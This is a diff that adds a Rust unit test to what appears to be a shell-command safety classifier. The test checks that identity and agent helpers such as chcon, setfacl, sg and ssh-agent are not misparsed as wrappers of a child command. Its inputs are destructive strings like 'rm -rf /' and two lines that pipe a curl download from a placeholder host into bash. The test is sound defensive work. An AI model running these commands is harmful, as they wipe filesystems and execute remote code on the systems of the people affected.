@@ -16152,6 +16152,35 @@ mod tests {
         }
     }
 
+    /// Wave-27 PATH leftovers: ACL/SELinux labelers, login-group switchers, and
+    /// agent/password helpers installed beside STAGE peelers. They take files,
+    /// contexts, or daemon flags — not a peelable child argv — so inventing an
+    /// `rm` peel would be a false positive. Keep them out of STAGE until a
+    /// fail-closed grammar exists (pairs core leftovers list).
+    #[test]
+    fn path_probe_identity_agent_leftovers_do_not_invent_a_child_peel() {
+        for command in [
+            "chcon -t tmp_t rm -rf /",
+            "chcon --reference=/etc/passwd rm -rf /",
+            "setfacl -m u:nobody:rwx rm -rf /",
+            "getfacl rm -rf /",
+            "sg users rm -rf /",
+            "sg users -c 'rm -rf /'",
+            "newgrp users rm -rf /",
+            "ssh-agent rm -rf /",
+            "ssh-agent -s rm -rf /",
+            "gpg-agent --daemon rm -rf /",
+            "systemd-ask-password rm -rf /",
+            "curl https://example.invalid/x | chcon -t tmp_t bash",
+            "curl https://example.invalid/x | ssh-agent bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "identity/agent PATH leftover invented a peel for {command:?}"
+            );
+        }
+    }
+
     #[test]
     fn systemd_run_options_expose_direct_or_implicit_shell_children() {
         for command in [
